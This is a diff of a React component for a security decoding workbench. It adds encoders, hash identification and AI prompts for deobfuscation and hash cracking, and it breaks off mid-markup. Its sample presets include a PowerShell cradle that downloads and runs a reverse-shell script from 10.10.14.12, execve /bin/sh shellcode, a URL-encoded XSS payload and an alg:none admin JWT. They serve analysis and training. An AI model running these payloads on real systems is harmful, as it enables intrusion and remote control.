@@ -3,14 +3,20 @@ import {
   Key,
   Hash,
   Binary,
-  ShieldAlert,
   Copy,
   Check,
-  Zap,
   RotateCcw,
   Sparkles,
+  ArrowRightLeft,
+  ArrowRight,
+  ArrowDownUp,
   Search,
-  BookOpen,
+  Lock,
+  Unlock,
+  Shield,
+  ShieldAlert,
+  Layers,
+  FileCode,
 } from 'lucide-react';
 import {
   encodeBase64,
@@ -19,15 +25,42 @@ import {
   decodeHex,
   encodeURL,
   decodeURL,
+  encodeHTML,
+  decodeHTML,
+  encodeBinary,
+  decodeBinary,
+  encodeUnicode,
+  decodeUnicode,
+  encodeBase64URL,
+  decodeBase64URL,
+  encodeDecimalASCII,
+  decodeDecimalASCII,
+  caesarShift,
+  reverseString,
   rot13,
   xorTransform,
   calculateShannonEntropy,
   calculateHashes,
+  identifyHashTypes,
+  type IdentifiedHash,
   parseJWT,
   defang,
   refang,
 } from '../../lib/security/transformers';
+import CustomSelect from '../CustomSelect';
 import styles from './DecoderHub.module.css';
+
+const DECODER_PRESET_OPTIONS = [
+  { value: 'vulnerable_jwt', label: 'JWT (alg:none / Admin Claim)', badge: 'JWT' },
+  { value: 'base64_payload', label: 'PowerShell Base64 Payload', badge: 'Base64' },
+  { value: 'hex_shellcode', label: 'Hex Shellcode (execve /bin/sh)', badge: 'Shellcode' },
+  { value: 'mystery_ntlm', label: 'NTLM Windows Hash Sample', badge: 'NTLM' },
+  { value: 'mystery_bcrypt', label: 'Bcrypt Password Hash Sample', badge: 'Bcrypt' },
+  { value: 'mystery_sha256', label: 'SHA-256 Mystery Hash Sample', badge: 'SHA256' },
+  { value: 'url_encoded_xss', label: 'Double URL Encoded XSS', badge: 'URL' },
+  { value: 'xor_sample', label: 'XOR Obfuscated Hex String', badge: 'XOR' },
+  { value: 'binary_secret', label: '8-Bit Binary Encoded String', badge: 'Binary' },
+];
 
 interface DecoderHubProps {
   initialInput?: string;
@@ -36,12 +69,18 @@ interface DecoderHubProps {
 }
 
 const DECODER_INPUT_STORAGE_KEY = 'nexus_security_decoder_input';
+const DECODER_OUTPUT_STORAGE_KEY = 'nexus_security_decoder_output';
 
 const DECODER_PRESETS = {
   vulnerable_jwt: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.",
   base64_payload: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object Net.WebClient).DownloadString('http://10.10.14.12/rev.ps1')\"",
   hex_shellcode: "31c050682f2f7368682f62696e89e3505389e1b00bcd80",
+  mystery_ntlm: "b4b9b02e6f09a9bd760f388b67351e2b",
+  mystery_bcrypt: "$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW",
+  mystery_sha256: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
+  url_encoded_xss: "%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E",
   xor_sample: "3a3d242720233c3a3b2b",
+  binary_secret: "01000001 01100100 01101101 01101001 01101110 01010000 01100001 01110011 01110011",
 };
 
 export default function DecoderHub({
@@ -58,9 +97,34 @@ export default function DecoderHub({
     }
   });
 
+  const [output, setOutput] = useState(() => {
+    try {
+      return localStorage.getItem(DECODER_OUTPUT_STORAGE_KEY) || '';
+    } catch {
+      return '';
+    }
+  });
+
+  const [lastAction, setLastAction] = useState<string>('');
+  const [xorKey, setXorKey] = useState('0x5A');
+  const [caesarShiftNum, setCaesarShiftNum] = useState(13);
+  const [copiedKey, setCopiedKey] = useState<string | null>(null);
+
   useEffect(() => {
     if (initialInput) setInput(initialInput);
   }, [initialInput]);
+
+  useEffect(() => {
+    const handleSecurityEvent = (e: Event) => {
+      const custom = e as CustomEvent<{ tab?: string; input?: string; code?: string }>;
+      if (custom.detail?.tab === 'decoders') {
+        const text = custom.detail.input || custom.detail.code;
+        if (text) setInput(text);
+      }
+    };
+    window.addEventListener('nexus:open-security', handleSecurityEvent);
+    return () => window.removeEventListener('nexus:open-security', handleSecurityEvent);
+  }, []);
 
   useEffect(() => {
     try {
@@ -69,8 +133,14 @@ export default function DecoderHub({
       console.error(e);
     }
   }, [input]);
-  const [xorKey, setXorKey] = useState('0x5A');
-  const [copiedKey, setCopiedKey] = useState<string | null>(null);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem(DECODER_OUTPUT_STORAGE_KEY, output);
+    } catch (e) {
+      console.error(e);
+    }
+  }, [output]);
 
   const copyToClipboard = (text: string, key: string) => {
     navigator.clipboard.writeText(text);
@@ -78,9 +148,40 @@ export default function DecoderHub({
     setTimeout(() => setCopiedKey(null), 2000);
   };
 
+  // Perform Transform (Input -> Output)
+  const handleTransform = (actionName: string, transformFn: (val: string) => string) => {
+    const res = transformFn(input);
+    setOutput(res);
+    setLastAction(actionName);
+  };
+
+  // 2-Way Swap Action (Input <-> Output)
+  const handleSwap = () => {
+    const temp = input;
+    setInput(output);
+    setOutput(temp);
+    setLastAction('Swapped Input ⇄ Output');
+  };
+
+  // Use Output as Input (Chain)
+  const handleUseOutputAsInput = () => {
+    setInput(output);
+    setOutput('');
+    setLastAction('Piped Output ➔ Input');
+  };
+
+  // Analysis Metrics
   const entropy = useMemo(() => calculateShannonEntropy(input), [input]);
+  const outputEntropy = useMemo(() => calculateShannonEntropy(output), [output]);
   const hashes = useMemo(() => calculateHashes(input), [input]);
-  const jwt = useMemo(() => parseJWT(input), [input]);
+  const activeJWT = useMemo(() => parseJWT(input) || parseJWT(output), [input, output]);
+
+  // Mystery Hash Detection
+  const identifiedInputHashes = useMemo(() => identifyHashTypes(input), [input]);
+  const identifiedOutputHashes = useMemo(() => identifyHashTypes(output), [output]);
+  const activeIdentified = useMemo(() => {
+    return identifiedInputHashes.length > 0 ? identifiedInputHashes : identifiedOutputHashes;
+  }, [identifiedInputHashes, identifiedOutputHashes]);
 
   const entropyAssessment = useMemo(() => {
     if (!input) return { label: 'Empty', color: 'badgeInfo' };
@@ -90,10 +191,10 @@ export default function DecoderHub({
     return { label: 'Low (Structured / Repetitive)', color: 'badgeInfo' };
   }, [entropy, input]);
 
-  // AI Prompt Handlers with rich context
+  // AI Actions
   const handleAIDeobfuscate = () => {
-    const payloadToAnalyze = input.trim() || DECODER_PRESETS.base64_payload;
-    const prompt = `I am analyzing an obfuscated security artifact / mystery payload in the Decoders Hub:
+    const payloadToAnalyze = input.trim() || output.trim() || DECODER_PRESETS.base64_payload;
+    const prompt = `I am analyzing an obfuscated security artifact / mystery payload in the 2-Way Decoders Hub:
 
 \`\`\`
 ${payloadToAnalyze}
@@ -103,6 +204,7 @@ ${payloadToAnalyze}
 - **Shannon Entropy**: ${entropy} bits (${entropyAssessment.label})
 - **MD5 Hash**: \`${hashes.md5}\`
 - **SHA-256 Hash**: \`${hashes.sha256}\`
+${lastAction ? `- **Recent Transform**: ${lastAction}` : ''}
 
 Please act as an expert Malware Reverse Engineer & Deobfuscation Specialist:
 1. **Identify Encoding/Packing**: What encoding, compression, XOR layer, or packing technique is used?
@@ -113,10 +215,10 @@ Please act as an expert Malware Reverse Engineer & Deobfuscation Specialist:
   };
 
   const handleAIJWTAudit = () => {
-    const tokenToAnalyze = jwt ? input.trim() : DECODER_PRESETS.vulnerable_jwt;
+    const tokenToAnalyze = (activeJWT ? (parseJWT(input) ? input : output) : DECODER_PRESETS.vulnerable_jwt).trim();
     const parsedToken = parseJWT(tokenToAnalyze);
 
-    const prompt = `I am conducting an authorized penetration test on this JSON Web Token (JWT) in Decoders Hub:
+    const prompt = `I am conducting an authorized penetration test on this JSON Web Token (JWT) in 2-Way Decoders Hub:
 
 \`\`\`
 ${tokenToAnalyze}
@@ -144,327 +246,490 @@ Please provide an in-depth **JWT Security Assessment**:
   };
 
   const handleAIHashAnalysis = () => {
-    const prompt = `I have generated cryptographic hashes and checksums for security analysis in the Decoders Hub:
+    const rawTarget = input.trim() || hashes.md5;
+    const detected = identifyHashTypes(rawTarget);
 
-- **Raw Input Preview**: \`${input.trim() ? input.slice(0, 100) : 'Sample Input'}\`
-- **MD5**: \`${hashes.md5}\`
-- **SHA-1**: \`${hashes.sha1}\`
-- **SHA-256**: \`${hashes.sha256}\`
-- **SHA-512**: \`${hashes.sha512}\`
+    let prompt = `I am analyzing a cryptographic hash / artifact in the Decoders Hub:
 
-Please provide a **Threat Intelligence & Hash Cracking Strategy**:
-1. **Threat Lookup**: Are there known public malware families, CVE exploits, or IoC records associated with these checksums?
-2. **Hashcat & John Syntax**: Provide the exact command line to test/crack these hashes using wordlists (\`rockyou.txt\`) and mutation rules (\`best64.rule\`).
-3. **Collision Resistance**: Explain cryptographic security implications if these algorithms are used for password hashing or integrity verification.`;
-    onSendToAI(prompt);
-  };
+- **Target Hash String**: \`${rawTarget}\`
+- **Computed Real-Time Checksums**:
+  - **MD5**: \`${hashes.md5}\`
+  - **SHA-1**: \`${hashes.sha1}\`
+  - **SHA-256**: \`${hashes.sha256}\`
+  - **SHA-512**: \`${hashes.sha512}\`
+`;
 
-  const handleAICipherBreaker = () => {
-    const prompt = `I am analyzing ciphers and encoded strings in the Decoders Hub.
-- **Active String**: \`${input.trim() || 'Sample String'}\`
-- **Current XOR Key Shift**: \`${xorKey}\`
+    if (detected.length > 0) {
+      prompt += `
+**Local Signature Matches**:
+${detected.map((d) => `- **${d.name}** (Hashcat: \`${d.hashcatMode}\`, John: \`${d.johnFormat}\`, Category: ${d.category}): ${d.description}`).join('\n')}
+`;
+    }
 
-Please suggest:
-1. Multi-step CyberChef / Python decryption recipes (e.g. Base64 -> XOR -> Gunzip -> Rot13).
-2. Frequency analysis and heuristics to automatically determine unknown XOR keys or Caesar/Vigenère shifts.`;
+    prompt += `
+Please provide an in-depth **Hash Identification & Cracking Strategy**:
+1. **Hash Verification**: Confirm the exact algorithm, iteration scheme, and source system (e.g. Linux shadow, Windows NTLM, WordPress, Django, MySQL, API Token).
+2. **Hashcat & John Commands**: Provide optimized cracking commands with rule files (\`best64.rule\`, \`OneRuleToRuleThemAll\`) and wordlists (\`rockyou.txt\`).
+3. **Plaintext / Known Lookup**: Check if this matches standard test hashes (e.g. empty string, admin, password, known CVE salts).`;
+
     onSendToAI(prompt);
   };
 
   return (
     <div className={styles.decoderContainer}>
-      {/* Master Input Card */}
-      <div className={styles.quickCard}>
+      {/* 2-Way Interactive Encoder / Decoder Workbench */}
+      <div className={styles.workbenchCard}>
+        {/* Header Bar */}
         <div className={styles.cardHeader}>
-          <span className={styles.cardTitle}>
-            <Search size={16} color="var(--accent-color)" /> Input Data / Payload / Token
-          </span>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
-            <select
-              className={styles.presetSelect}
-              onChange={(e) => {
-                const val = e.target.value as keyof typeof DECODER_PRESETS;
-                if (DECODER_PRESETS[val]) setInput(DECODER_PRESETS[val]);
-              }}
-            >
-              <option value="">Load Preset Example...</option>
-              <option value="vulnerable_jwt">JWT (alg:none / Admin Claim)</option>
-              <option value="base64_payload">PowerShell Base64 Payload</option>
-              <option value="hex_shellcode">Hex Shellcode (execve /bin/sh)</option>
-              <option value="xor_sample">XOR Obfuscated Hex String</option>
-            </select>
-            <span className={`${styles.cardBadge} ${styles[entropyAssessment.color]}`}>
-              Entropy: {entropy} bits ({entropyAssessment.label})
+          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
+            <span className={styles.cardTitle}>
+              <ArrowRightLeft size={17} color="var(--accent-color)" /> 2-Way Security Encoder &amp; Decoder
             </span>
+            {lastAction && (
+              <span className={styles.lastActionBadge}>
+                Active: {lastAction}
+              </span>
+            )}
+          </div>
+
+          <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', flexWrap: 'wrap' }}>
+            <CustomSelect
+              value=""
+              placeholder="Load Sample Preset..."
+              options={DECODER_PRESET_OPTIONS}
+              onChange={(val) => {
+                const key = val as keyof typeof DECODER_PRESETS;
+                if (DECODER_PRESETS[key]) {
+                  setInput(DECODER_PRESETS[key]);
+                  setOutput('');
+                  setLastAction(`Loaded preset: ${key}`);
+                }
+              }}
+              style={{ minWidth: '200px' }}
+            />
+            <button
+              className={`${styles.btn} ${styles.btnPrimary}`}
+              onClick={handleAIDeobfuscate}
+              title="Analyze payload with AI (decompression, XOR, packing detection & deobfuscation)"
+            >
+              <Sparkles size={13} /> AI Deobfuscate
+            </button>
           </div>
         </div>
 
-        <textarea
-          className={styles.textarea}
-          value={input}
-          onChange={(e) => setInput(e.target.value)}
-          placeholder="Paste raw string, base64 payload, hex dump, JWT, log line, or obfuscated script here..."
-          rows={3}
-        />
+        {/* 2-Way Split Panes (Input on Left, Output on Right) */}
+        <div className={styles.panesGrid}>
+          {/* Left Pane: Input / Source */}
+          <div className={styles.paneColumn}>
+            <div className={styles.paneHeader}>
+              <span className={styles.paneTitle}>
+                <Lock size={14} color="#38bdf8" /> Input / Source Data
+              </span>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
+                <span className={`${styles.cardBadge} ${styles[entropyAssessment.color]}`}>
+                  Entropy: {entropy} bits
+                </span>
+                <span className={styles.charCount}>
+                  {input.length} chars ({new Blob([input]).size} B)
+                </span>
+                <button
+                  className={styles.btn}
+                  onClick={() => copyToClipboard(input, 'input')}
+                  title="Copy Input Text"
+                >
+                  {copiedKey === 'input' ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
+                  {copiedKey === 'input' ? 'Copied' : 'Copy'}
+                </button>
+                <button
+                  className={styles.btn}
+                  onClick={() => {
+                    setInput('');
+                    setOutput('');
+                    setLastAction('');
+                  }}
+                  title="Clear both Input and Output"
+                >
+                  <RotateCcw size={12} /> Clear
+                </button>
+              </div>
+            </div>
 
-        <div className={styles.actionRow}>
-          <button
-            className={styles.btn}
-            onClick={() => setInput(defang(input))}
-            title="Defang URLs/IPs into safe hxxp[://] format"
-          >
-            🛡️ Defang IoCs
-          </button>
-          <button
-            className={styles.btn}
-            onClick={() => setInput(refang(input))}
-            title="Refang safe URLs/IPs back to raw format"
-          >
-            🔗 Refang
-          </button>
-          <button
-            className={styles.btn}
-            onClick={() => setInput('')}
-            title="Clear input"
-          >
-            <RotateCcw size={12} /> Clear
-          </button>
+            <textarea
+              className={styles.textarea}
+              value={input}
+              onChange={(e) => setInput(e.target.value)}
+              placeholder="Paste raw string, base64 payload, hex dump, JWT, URL, or obfuscated script here..."
+              spellCheck={false}
+            />
 
-          {/* Prominent Always-Visible AI Action */}
-          <button
-            className={`${styles.btn} ${styles.btnPrimary}`}
-            onClick={handleAIDeobfuscate}
-            title="Analyze payload with AI (decompression, XOR, packing detection & deobfuscation)"
-          >
-            <Sparkles size={13} /> AI Deobfuscate & Analyze
-          </button>
+            {/* Quick Helper Tools under Input */}
+            <div className={styles.quickHelpers}>
+              <button
+                className={styles.btn}
+                onClick={() => handleTransform('Defang IoCs', defang)}
+                title="Defang URLs/IPs into safe hxxp[://] format"
+              >
+                🛡️ Defang IoCs
+              </button>
+              <button
+                className={styles.btn}
+                onClick={() => handleTransform('Refang IoCs', refang)}
+                title="Refang safe URLs/IPs back to raw format"
+              >
+                🔗 Refang
+              </button>
+              <button
+                className={styles.btn}
+                onClick={() => handleTransform('Reverse String', reverseString)}
+                title="Reverse character order"
+              >
+                ⇄ Reverse String
+              </button>
+            </div>
+          </div>
+
+          {/* Center Swap / Direction Controls */}
+          <div className={styles.centerControls}>
+            <button
+              className={`${styles.btn} ${styles.btnSwap}`}
+              onClick={handleSwap}
+              title="Swap Input and Output (2-Way transfer)"
+            >
+              <ArrowRightLeft size={15} /> Swap
+            </button>
+            <button
+              className={styles.btn}
+              onClick={handleUseOutputAsInput}
+              title="Pipe output back into input to chain encodings"
+            >
+              <ArrowDownUp size={13} /> Output ➔ Input
+            </button>
+          </div>
+
+          {/* Right Pane: Output / Result */}
+          <div className={styles.paneColumn}>
+            <div className={styles.paneHeader}>
+              <span className={styles.paneTitle}>
+                <Unlock size={14} color="#10b981" /> Transformed Output
+              </span>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
+                {output && (
+                  <span className={`${styles.cardBadge} ${styles.cardBadgeGreen}`}>
+                    Entropy: {outputEntropy} bits
+                  </span>
+                )}
+                <span className={styles.charCount}>
+                  {output.length} chars ({new Blob([output]).size} B)
+                </span>
+                <button
+                  className={styles.btn}
+                  onClick={() => copyToClipboard(output, 'output')}
+                  title="Copy Output Result"
+                >
+                  {copiedKey === 'output' ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
+                  {copiedKey === 'output' ? 'Copied' : 'Copy'}
+                </button>
+                {onSendToSandbox && output.trim() && (
+                  <button
+                    className={styles.btn}
+                    onClick={() => onSendToSandbox(output)}
+                    title="Send output payload to Python / JS Sandbox"
+                  >
+                    <FileCode size={12} color="#f59e0b" /> To Sandbox
+                  </button>
+                )}
+              </div>
+            </div>
+
+            <textarea
+              className={`${styles.textarea} ${styles.outputTextarea}`}
+              value={output}
+              readOnly
+              placeholder="Transformed result will appear here. Click any Encode or Decode button below..."
+              spellCheck={false}
+            />
+          </div>
+        </div>
+
+        {/* 2-Way Transformation Toolbars Grouped by Format */}
+        <div className={styles.transformsSection}>
+          <div className={styles.sectionHeader}>
+            <Binary size={15} color="#38bdf8" />
+            <span>2-Way Encoders &amp; Decoders</span>
+          </div>
+
+          <div className={styles.transformGrid}>
+            {/* Base64 & Base64URL */}
+            <div className={styles.transformGroup}>
+              <div className={styles.groupLabel}>Base64 &amp; Base64URL</div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Base64 Encode', encodeBase64)}>
+                  Encode Base64 <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('Base64 Decode', decodeBase64)}>
+                  <ArrowRight size={11} /> Decode Base64
+                </button>
+              </div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Base64URL Encode', encodeBase64URL)}>
+                  Encode B64URL <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('Base64URL Decode', decodeBase64URL)}>
+                  <ArrowRight size={11} /> Decode B64URL
+                </button>
+              </div>
+            </div>
+
+            {/* Hex & Binary (8-bit) */}
+            <div className={styles.transformGroup}>
+              <div className={styles.groupLabel}>Hex &amp; Binary</div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Hex Encode', encodeHex)}>
+                  Encode Hex <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('Hex Decode', decodeHex)}>
+                  <ArrowRight size={11} /> Decode Hex
+                </button>
+              </div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Binary Encode', encodeBinary)}>
+                  Encode Binary <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('Binary Decode', decodeBinary)}>
+                  <ArrowRight size={11} /> Decode Binary
+                </button>
+              </div>
+            </div>
+
+            {/* URL, HTML & Unicode */}
+            <div className={styles.transformGroup}>
+              <div className={styles.groupLabel}>URL, HTML &amp; Unicode</div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('URL Encode', encodeURL)}>
+                  Encode URL <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('URL Decode', decodeURL)}>
+                  <ArrowRight size={11} /> Decode URL
+                </button>
+              </div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('HTML Encode', encodeHTML)}>
+                  HTML Entity <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('HTML Decode', decodeHTML)}>
+                  <ArrowRight size={11} /> Decode HTML
+                </button>
+              </div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Unicode Escape', encodeUnicode)}>
+                  \uXXXX Encode <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform('Unicode Decode', decodeUnicode)}>
+                  <ArrowRight size={11} /> Decode \uXXXX
+                </button>
+              </div>
+            </div>
+
+            {/* Ciphers: XOR, Caesar & Rot13 */}
+            <div className={styles.transformGroup}>
+              <div className={styles.groupLabel}>Ciphers &amp; Shifts</div>
+              <div className={styles.btnPair}>
+                <button className={styles.btn} onClick={() => handleTransform('Rot13 Cipher', rot13)}>
+                  Rot13 (+13) <ArrowRight size={11} />
+                </button>
+                <button className={styles.btn} onClick={() => handleTransform(`Caesar Shift (+${caesarShiftNum})`, (val) => caesarShift(val, caesarShiftNum))}>
+                  Shift (+{caesarShiftNum}) <ArrowRight size={11} />
+                </button>
+              </div>
+
+              {/* XOR Shift with Key */}
+              <div className={styles.xorBox}>
+                <span className={styles.xorLabel}>XOR Key:</span>
+                <input
+                  type="text"
+                  className={styles.xorInput}
+                  value={xorKey}
+                  onChange={(e) => setXorKey(e.target.value)}
+                  placeholder="0x5A or secret"
+                />
+                <button
+                  className={`${styles.btn} ${styles.btnPrimary}`}
+                  onClick={() => handleTransform(`XOR (Key: ${xorKey})`, (val) => xorTransform(val, xorKey))}
+                >
+                  Apply XOR
+                </button>
+              </div>
+            </div>
+          </div>
         </div>
       </div>
 
-      {/* Grid of Decoders & Analyzers */}
-      <div className={styles.toolGrid}>
-        {/* Transformations & Ciphers Card */}
-        <div className={styles.quickCard}>
-          <div className={styles.cardHeader}>
-            <span className={styles.cardTitle}>
-              <Binary size={16} color="#38bdf8" /> Transformations & Ciphers
-            </span>
-            <button
-              className={styles.btn}
-              onClick={handleAICipherBreaker}
-              title="Ask AI for custom decryption recipe and cipher analysis"
-            >
-              <Sparkles size={11} /> AI Cipher Breaker
-            </button>
-          </div>
-
-          <div className={styles.actionRow}>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(encodeBase64(input))}
-            >
-              Base64 Encode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(decodeBase64(input))}
-            >
-              Base64 Decode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(encodeHex(input))}
-            >
-              Hex Encode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(decodeHex(input))}
-            >
-              Hex Decode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(encodeURL(input))}
-            >
-              URL Encode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(decodeURL(input))}
-            >
-              URL Decode
-            </button>
-            <button
-              className={styles.btn}
-              onClick={() => setInput(rot13(input))}
-            >
-              Rot13
-            </button>
-          </div>
-
-          <div className={styles.inputGroup} style={{ marginTop: '0.4rem' }}>
-            <span className={styles.inputLabel}>
-              XOR Cipher Shift (Key)
-            </span>
-            <div style={{ display: 'flex', gap: '0.5rem' }}>
-              <input
-                type="text"
-                value={xorKey}
-                onChange={(e) => setXorKey(e.target.value)}
-                style={{
-                  flex: 1,
-                  background: 'var(--input-bg)',
-                  border: '1px solid var(--input-border)',
-                  borderRadius: '6px',
-                  padding: '0.3rem 0.5rem',
-                  color: 'var(--text-primary)',
-                  fontSize: '0.75rem',
-                }}
-                placeholder="XOR key (e.g. 0x5A or secret)"
-              />
-              <button
-                className={styles.btn}
-                onClick={() => setInput(xorTransform(input, xorKey))}
-              >
-                Apply XOR
-              </button>
-            </div>
-          </div>
-        </div>
-
-        {/* Cryptographic Hashes Card */}
-        <div className={styles.quickCard}>
-          <div className={styles.cardHeader}>
-            <span className={styles.cardTitle}>
-              <Hash size={16} color="#fbbf24" /> Cryptographic Hashes (IoCs)
-            </span>
-            <button
-              className={`${styles.btn} ${styles.btnPrimary}`}
-              onClick={handleAIHashAnalysis}
-              title="Ask AI for hash lookup and Hashcat cracking commands"
-            >
-              <Sparkles size={11} /> Hashcat Syntax & Crack
-            </button>
-          </div>
-
-          <table className={styles.hashTable}>
-            <tbody>
-              <tr>
-                <td className={styles.hashLabel}>MD5</td>
-                <td className={styles.hashVal}>{hashes.md5}</td>
-                <td>
-                  <button
-                    className={styles.btn}
-                    onClick={() => copyToClipboard(hashes.md5, 'md5')}
-                  >
-                    {copiedKey === 'md5' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
-                  </button>
-                </td>
-              </tr>
-              <tr>
-                <td className={styles.hashLabel}>SHA-1</td>
-                <td className={styles.hashVal}>{hashes.sha1}</td>
-                <td>
-                  <button
-                    className={styles.btn}
-                    onClick={() => copyToClipboard(hashes.sha1, 'sha1')}
-                  >
-                    {copiedKey === 'sha1' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
-                  </button>
-                </td>
-              </tr>
-              <tr>
-                <td className={styles.hashLabel}>SHA-256</td>
-                <td className={styles.hashVal}>{hashes.sha256}</td>
-                <td>
-                  <button
-                    className={styles.btn}
-                    onClick={() => copyToClipboard(hashes.sha256, 'sha256')}
-                  >
-                    {copiedKey === 'sha256' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
-                  </button>
-                </td>
-              </tr>
-              <tr>
-                <td className={styles.hashLabel}>SHA-512</td>
-                <td className={styles.hashVal}>{hashes.sha512.slice(0, 32)}...</td>
-                <td>
-                  <button
-                    className={styles.btn}
-                    onClick={() => copyToClipboard(hashes.sha512, 'sha512')}
-                  >
-                    {copiedKey === 'sha512' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
-                  </button>
-                </td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
+      {/* Deep Security Analyzers Grid */}
+      <div className={styles.analyzerGrid}>
         {/* JWT Inspector Card */}
-        <div className={styles.quickCard} style={{ gridColumn: '1 / -1' }}>
+        <div className={styles.quickCard}>
           <div className={styles.cardHeader}>
             <span className={styles.cardTitle}>
-              <Key size={16} color="#a78bfa" /> JSON Web Token (JWT) Security Inspector
+              <Key size={16} color="#fbbf24" /> JWT Token Inspector
             </span>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
-              {jwt && (
-                <span className={`${styles.cardBadge} ${jwt.isExpired ? styles.badgeWarning : styles.cardBadge}`}>
-                  {jwt.algorithm} • {jwt.isExpired ? 'EXPIRED' : 'ACTIVE'}
-                </span>
-              )}
-              <button
-                className={`${styles.btn} ${styles.btnPrimary}`}
-                onClick={handleAIJWTAudit}
-                title="Audit JWT for alg:none, key confusion, and claim spoofing"
-              >
-                <Sparkles size={12} /> AI JWT Security Audit
-              </button>
-            </div>
+            <button
+              className={styles.btn}
+              onClick={handleAIJWTAudit}
+              title="Audit JWT for alg:none, key confusion, and privilege escalation"
+            >
+              <Sparkles size={12} /> AI JWT Audit
+            </button>
           </div>
 
-          {jwt ? (
+          {activeJWT ? (
             <div className={styles.jwtView}>
-              {jwt.warnings && jwt.warnings.length > 0 && (
+              <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', alignItems: 'center' }}>
+                <span className={styles.cardBadge}>Algorithm: {activeJWT.algorithm}</span>
+                {activeJWT.isExpired ? (
+                  <span className={`${styles.cardBadge} ${styles.badgeWarning}`}>EXPIRED</span>
+                ) : (
+                  <span className={`${styles.cardBadge} ${styles.cardBadgeGreen}`}>ACTIVE</span>
+                )}
+                {activeJWT.expiresAt && (
+                  <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>
+                    Exp: {new Date(activeJWT.expiresAt).toLocaleString()}
+                  </span>
+                )}
+              </div>
+
+              {activeJWT.warnings && activeJWT.warnings.length > 0 && (
                 <div className={styles.warningList}>
-                  {jwt.warnings.map((w, idx) => (
-                    <div key={idx} className={styles.warningItem}>
-                      <ShieldAlert size={12} style={{ display: 'inline', marginRight: '4px' }} />
-                      {w}
+                  {activeJWT.warnings.map((w, i) => (
+                    <div key={i} className={styles.warningItem}>
+                      <ShieldAlert size={12} /> {w}
                     </div>
                   ))}
                 </div>
               )}
+
               <div className={styles.jwtGrid}>
-                <div className={styles.inputGroup}>
-                  <span className={styles.inputLabel}>Header (Algorithm & Typ)</span>
-                  <pre className={styles.jsonBox}>{JSON.stringify(jwt.header, null, 2)}</pre>
+                <div>
+                  <div className={styles.inputLabel}>Decoded Header</div>
+                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.header, null, 2)}</pre>
                 </div>
-                <div className={styles.inputGroup}>
-                  <span className={styles.inputLabel}>Payload (Claims & Scope)</span>
-                  <pre className={styles.jsonBox}>{JSON.stringify(jwt.payload, null, 2)}</pre>
+                <div>
+                  <div className={styles.inputLabel}>Decoded Payload Claims</div>
+                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.payload, null, 2)}</pre>
                 </div>
               </div>
-              {onSendToSandbox && (
-                <div className={styles.actionRow} style={{ marginTop: '0.5rem' }}>
-                  <button
-                    className={styles.btn}
-                    onClick={() =>
-                      onSendToSandbox(
-                        `# Verifying JWT signature with Pyodide sandbox\nimport hmac, hashlib, base64, json\ntoken = "${input.trim()}"\nprint("[*] Inspecting token:", token[:25] + "...")\n`
-                      )
-                    }
-                  >
-                    <Zap size={12} /> Send Token to Python Sandbox
-                  </button>
-                </div>
-              )}
             </div>
           ) : (
-            <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>
-              No valid JWT detected in input. Enter a three-part token (`header.payload.signature`) or click <strong>Load Preset Example</strong> above to test JWT security analysis.
+            <div style={{ padding: '1.25rem', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.8rem' }}>
+              <Key size={24} style={{ opacity: 0.4, marginBottom: '0.4rem' }} />
+              <div>No valid JWT detected in Input or Output.</div>
+              <div style={{ fontSize: '0.74rem', marginTop: '0.2rem' }}>
